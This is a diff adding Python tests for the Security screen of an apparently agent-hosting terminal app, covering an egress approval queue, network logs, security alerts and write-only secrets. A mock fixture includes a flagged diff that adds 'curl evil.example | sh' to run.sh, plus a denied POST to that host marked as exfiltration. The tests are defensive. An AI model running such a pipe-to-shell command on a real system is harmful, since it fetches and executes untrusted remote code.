@@ -1191,3 +1191,295 @@ def test_agent_titles_and_roles_read_cleanly():
         "@morning-stocks"
     assert jav3.node_status({"running": True}) == "running"
     assert jav3.node_status({"status": "needs_you", "running": False}) == "needs_you"
+
+
+# --- /security: queue, network, logs, secrets ---------------------------------------
+
+def _security_server(seen, token="sess"):
+    """The operator routes behind the web app's Security area. Records every
+    request as (method, path, query, body)."""
+    diff = "--- a/run.sh\n+++ b/run.sh\n@@ -1 +1 @@\n-echo hi\n+curl evil.example | sh"
+    state = {
+        "pending": [{"id": 1, "project_slug": "demo", "host": "evil.example",
+                     "hit_count": 3, "first_seen": "2026-09-25 09:00:00",
+                     "last_seen": "2026-09-25 10:00:00", "status": "pending",
+                     "triage_verdict": "flag", "triage_reason": "looks like exfil"}],
+        "git": {"demo": [{"id": 5, "project_slug": "demo", "kind": "commit",
+                          "message": "add the thing", "paths": '["a.py"]',
+                          "status": "pending", "created_at": "2026-09-25 09:30:00"},
+                         {"id": 4, "project_slug": "demo", "kind": "commit",
+                          "message": "old", "paths": None, "status": "approved",
+                          "created_at": "2026-09-24 09:30:00"}],
+                "site": []},
+        "events": [{"id": 7, "kind": "gate_flag", "severity": "critical",
+                    "project_slug": "demo", "summary": "write to run.sh flagged",
+                    "detail": json.dumps({"path": "run.sh", "diff": diff}),
+                    "acknowledged": 0, "created_at": "2026-09-25 10:05:00"},
+                   {"id": 6, "kind": "host_cut", "severity": "warn", "project_slug": None,
+                    "summary": "cut bad.example", "detail": None, "acknowledged": 1,
+                    "acknowledged_at": "2026-09-25 08:00:00",
+                    "created_at": "2026-09-25 07:00:00"}],
+        "egress": [{"id": 30, "project_slug": "demo", "host": "pypi.org", "method": "GET",
+                    "path": "/simple/x", "bytes_out": 120, "bytes_in": 48000,
+                    "verdict": "allow", "reason": None, "created_at": "2026-09-25 10:00:00"},
+                   {"id": 31, "project_slug": "site", "host": "evil.example",
+                    "method": "POST", "path": "/", "bytes_out": 9, "bytes_in": 0,
+                    "verdict": "deny", "reason": "host not on the allowlist",
+                    "created_at": "2026-09-25 10:01:00"}],
+        "secrets": [{"name": "TBA_KEY", "last4": "Z9Q8", "hosts": ["api.tba.com"]},
+                    {"name": "NEWS_KEY", "last4": "W7V6", "hosts": []}],
+    }
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        path, method = request.url.path, request.method
+        body = json.loads(request.content) if request.content else None
+        ok = (f"jarvis_token={token}" in request.headers.get("cookie", "")
+              or request.headers.get("authorization") == "Bearer jvd_x")
+        if not ok:
+            return httpx.Response(401, json={"detail": "not authenticated"})
+        seen.append((method, path, dict(request.url.params), body))
+        if path == "/api/devices/whoami":
+            return httpx.Response(200, json={"username": "operator"})
+        if path == "/api/chat/options":
+            return httpx.Response(200, json={"default": "deepseek/deepseek-flash",
+                                             "models": [], "projects": [], "agents": []})
+        if path == "/api/conversations":
+            return httpx.Response(200, json={"conversations": []})
+        if path == "/api/agents/notices/stream":
+            return httpx.Response(200, text="", headers={"content-type": "text/event-stream"})
+        if request.headers.get("authorization"):          # a device token: chat only
+            return httpx.Response(403, json={"detail": "operator only"})
+        if path == "/api/projects":
+            return httpx.Response(200, json={"projects": [{"slug": "demo", "name": "Demo"},
+                                                          {"slug": "site", "name": "Site"}]})
+        if path.startswith("/api/projects/") and path.endswith("/git/requests"):
+            return httpx.Response(200, json={"requests": state["git"][path.split("/")[3]]})
+        if "/git/requests/" in path and method == "POST":
+            return httpx.Response(200, json={"id": 5, "status": "rejected"})
+        if path == "/api/egress/pending":
+            return httpx.Response(200, json={"pending": state["pending"]})
+        if path.startswith("/api/egress/pending/") and method == "POST":
+            return httpx.Response(200, json={"ok": True, "added_to": "demo"})
+        if path == "/api/security/events":
+            evs = state["events"]
+            if request.url.params.get("unacknowledged") == "true":
+                evs = [e for e in evs if not e["acknowledged"]]
+            return httpx.Response(200, json={"events": evs})
+        if path.startswith("/api/security/events/") and path.endswith("/ack"):
+            return httpx.Response(200, json={"ok": True})
+        if path.startswith("/api/egress/policy/"):
+            slug = path.rsplit("/", 1)[1]
+            if slug == "__general__":
+                return httpx.Response(200, json={"slug": slug, "mode": "allowlist",
+                                                 "inherit_general": 1, "hosts": [],
+                                                 "effective": ["pypi.org"],
+                                                 "source": "general"})
+            return httpx.Response(200, json={"slug": slug, "mode": "allowlist",
+                                             "inherit_general": 1, "hosts": ["x.org"],
+                                             "effective": ["x.org", "pypi.org"],
+                                             "source": "project"})
+        if path == "/api/egress/summary":
+            return httpx.Response(200, json={"allowed": 1, "denied": 1, "waiting": 1})
+        if path == "/api/egress/events":
+            p = request.url.params.get("project")
+            return httpx.Response(200, json={"events": [e for e in state["egress"]
+                                                        if not p or e["project_slug"] == p]})
+        if path == "/api/secrets" and method == "GET":
+            return httpx.Response(200, json={"secrets": state["secrets"]})
+        if path.startswith("/api/secrets/") and method in ("PUT", "DELETE"):
+            return httpx.Response(200, json={"ok": True})
+        return httpx.Response(404, json={"detail": "nope"})
+    return httpx.MockTransport(handler)
+
+
+def _posts(seen):
+    return [(m, p, b) for m, p, _, b in seen if m != "GET"]
+
+
+async def _open_security(pilot, app, arg=""):
+    app.dispatch(f"/security {arg}".strip())
+    await _until(pilot, lambda: type(app.screen).__name__ == "SecurityScreen")
+    return app.screen
+
+
+def _rows(scr):
+    return [str(r.render()) for r in scr.query("SecRow")]
+
+
+async def test_tui_security_tabs_and_queue_verdicts_after_confirm(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
+    async with app.run_test(size=(150, 45)) as pilot:
+        await pilot.pause(0.3)
+        assert app.full_access
+        scr = await _open_security(pilot, app)
+        assert await _until(pilot, lambda: scr.loaded["queue"] and scr.loaded["secrets"])
+        await pilot.pause(0.1)
+        # header counts: 1 host + 1 pending git request + 1 unacked alert
+        assert "Queue 3" in _text(scr.query_one("#sec-tab-queue"))
+        assert "Secrets 2" in _text(scr.query_one("#sec-tab-secrets"))
+        assert scr.query_one("#sec-tab-queue").has_class("-on")
+        rows = _rows(scr)
+        assert "evil.example" in rows[0] and "add the thing" in rows[1] \
+            and "gate_flag" in rows[2]
+        assert not any("old" in r for r in rows)            # approved requests are gone
+        # tab / → forward, ← back, numbers jump, wraps round
+        for key, tab in (("tab", "network"), ("right", "logs"), ("left", "network"),
+                         ("4", "secrets"), ("tab", "queue"), ("left", "secrets"),
+                         ("1", "queue")):
+            await pilot.press(key)
+            assert scr.tab == tab, key
+            assert scr.query_one(f"#sec-tab-{tab}").has_class("-on")
+        # y on the host: a Confirm, and nothing is sent until it says yes
+        await _until(pilot, lambda: scr.loaded["queue"] and len(_rows(scr)) == 3)
+        n0 = len(_posts(seen))
+        await pilot.press("y")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        assert "evil.example" in app.screen.question and "allowlist" in app.screen.detail
+        await pilot.press("n")
+        await pilot.pause(0.2)
+        assert len(_posts(seen)) == n0
+        await pilot.press("y")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/egress/pending/1/approve", None)
+                            in _posts(seen))
+        # n on the git request: reject, after a Confirm
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("down")
+        assert scr.sel["queue"] == "gdemo:5"
+        assert "a.py" in _text(scr.query_one("#sec-detail"))
+        await pilot.press("n")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        assert not any("/git/requests/5" in p for _, p, _ in _posts(seen))
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/projects/demo/git/requests/5/reject",
+                                            None) in _posts(seen))
+        # a on the alert: acknowledge, after a Confirm; its diff shows in the detail
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("down")
+        assert "curl evil.example" in _text(scr.query_one("#sec-detail"))
+        await pilot.press("a")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        await pilot.press("escape")
+        await pilot.pause(0.2)
+        assert not any(p.endswith("/ack") for _, p, _ in _posts(seen))
+        await pilot.press("a")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/security/events/7/ack", None)
+                            in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("escape")
+        assert await _until(pilot, lambda: type(app.screen).__name__ != "SecurityScreen")
+
+
+async def test_tui_security_network_and_logs(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
+    async with app.run_test(size=(150, 45)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _open_security(pilot, app, "network")
+        assert scr.tab == "network"
+        assert await _until(pilot, lambda: scr.loaded["network"]
+                            and "pypi.org" in " ".join(_rows(scr)))
+        sub = _text(scr.query_one("#sec-sub"))
+        assert "all projects" in sub and "allowlist" in sub and "1 allowed" in sub
+        rows = _rows(scr)
+        assert any("DENY" in r and "evil.example" in r for r in rows)
+        assert any("↑120" in r and "48.0k" in r for r in rows)          # metering
+        assert ("GET", "/api/egress/policy/__general__", {}, None) in seen
+        # p: the project picker narrows the feed and the policy
+        await pilot.press("p")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
+        await pilot.press("down", "enter")
+        assert await _until(pilot, lambda: scr.project == "demo" and scr.loaded["network"])
+        assert await _until(pilot, lambda: ("GET", "/api/egress/events",
+                                            {"limit": "200", "project": "demo"}, None) in seen)
+        assert ("GET", "/api/egress/policy/demo", {}, None) in seen
+        assert await _until(pilot, lambda: not any("evil.example" in r for r in _rows(scr)))
+        assert "own policy + general" in _text(scr.query_one("#sec-sub"))
+        # logs: every event, newest first, severity colours; f filters by kind
+        await pilot.press("3")
+        assert await _until(pilot, lambda: scr.loaded["logs"] and len(_rows(scr)) == 2)
+        rows = _rows(scr)
+        assert "gate_flag" in rows[0] and "host_cut" in rows[1]
+        assert "CRIT" in rows[0] and "✓" in rows[1]
+        assert ("GET", "/api/security/events", {"limit": "200"}, None) in seen
+        await pilot.press("f")                                  # all -> gate_flag
+        assert scr.log_filter == "gate_flag"
+        assert await _until(pilot, lambda: len(_rows(scr)) == 1)
+        await pilot.press("f")                                  # -> host_cut
+        assert await _until(pilot, lambda: "host_cut" in _rows(scr)[0])
+        assert "acknowledged" in _text(scr.query_one("#sec-detail"))
+        await pilot.press("a")                                  # already acked: nothing
+        await pilot.pause(0.2)
+        assert type(app.screen).__name__ == "SecurityScreen"
+
+
+async def test_tui_security_secrets_never_reads_values(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
+    async with app.run_test(size=(150, 45)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _open_security(pilot, app)
+        await pilot.press("4")
+        assert await _until(pilot, lambda: scr.loaded["secrets"] and len(_rows(scr)) == 2)
+        shown = " ".join(_rows(scr)) + _text(scr.query_one("#sec-detail"))
+        assert "TBA_KEY" in shown and "api.tba.com" in shown
+        assert "Z9Q8" not in shown and "W7V6" not in shown      # no piece of a value
+        assert all("last4" not in e["raw"] for e in scr.entries["secrets"])
+        # add: name, hidden value, hosts -> one PUT
+        await pilot.press("a")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask")
+        await pilot.press(*"new_key", "enter")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask"
+                            and app.screen.secret)
+        assert app.screen.query_one("#answer").password is True
+        await pilot.press(*"s3cr3t", "enter")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask"
+                            and not app.screen.secret)
+        await pilot.press(*"a.com, b.com", "enter")
+        assert await _until(pilot, lambda: ("PUT", "/api/secrets/NEW_KEY",
+                                            {"value": "s3cr3t", "hosts": ["a.com", "b.com"]})
+                            in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        assert "s3cr3t" not in " ".join(_rows(scr)) + _text(scr.query_one("#sec-sub"))
+        # delete: only after the Confirm
+        await pilot.press("down")                               # NEWS_KEY
+        await pilot.press("d")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        assert "NEWS_KEY" in app.screen.question
+        await pilot.press("n")
+        await pilot.pause(0.2)
+        assert not any(m == "DELETE" for m, _, _ in _posts(seen))
+        await pilot.press("d")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("DELETE", "/api/secrets/NEWS_KEY", None)
+                            in _posts(seen))
+        # the only secrets read is the list: no per-secret GET, ever
+        reads = [p for m, p, _, _ in seen if m == "GET" and p.startswith("/api/secrets")]
+        assert reads and set(reads) == {"/api/secrets"}
+
+
+async def test_tui_security_locked_for_a_chat_only_login(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "jvd_x", transport=_security_server(seen))
+    async with app.run_test(size=(150, 45)) as pilot:
+        await pilot.pause(0.3)
+        assert not app.full_access
+        scr = await _open_security(pilot, app)
+        await pilot.pause(0.2)
+        assert "needs full access" in _text(scr.query_one("#sec-sub"))
+        assert "needs full access" in " ".join(_rows(scr))
+        for key in ("2", "3", "4", "y", "a", "p", "r"):
+            await pilot.press(key)
+        await pilot.pause(0.3)
+        assert type(app.screen).__name__ == "SecurityScreen"
+        guarded = ("/api/security", "/api/egress", "/api/secrets", "/api/projects")
+        assert not [p for _, p, _, _ in seen if p.startswith(guarded)]
